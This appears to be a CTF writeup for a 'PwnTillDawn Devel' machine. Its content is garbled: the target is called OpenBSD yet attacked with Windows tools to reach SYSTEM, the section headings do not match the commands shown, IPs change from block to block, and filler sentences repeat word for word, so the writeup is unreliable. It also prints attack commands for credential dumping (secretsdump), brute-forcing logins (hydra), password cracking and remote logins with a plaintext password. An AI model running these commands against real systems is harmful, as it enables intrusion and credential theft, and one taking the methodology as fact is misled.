---
TitleSEO: "PwnTillDawn — Devel (Medium OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Devel (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Devel. DCSync and XXE to achieve medium compromise on OpenBSD."
Keywords: "ctf, offsec, web"
URL: "https://zurefx.github.io/writeups/htb-devel-555.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-devel-555/"
Date: "2024-06-04"
Tags: "CTF, OffSec, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-devel-555"
Permalink: "/writeups/htb-devel-555.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Devel** is rated **Medium** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.56.21.88`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
evil-winrm -i 10.55.56.185 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Web Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
crackmapexec smb 10.80.40.2 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **DCSync**.

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.24.4.113
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.38.181.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.245.213
crackmapexec smb 10.113.183.44 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.49.197.100 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
nmap -sCV -p27017,21,110 10.90.44.87 -oN scan.txt
nmap -sCV -p143,8443,3306 10.121.191.140 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `impacket`
- `john`
- `wmiexec`
- `gobuster`
- `dcomexec`
- `kerbrute`
- `mimikatz`
- `chisel`

### Key Takeaways

- DCSync
- XXE
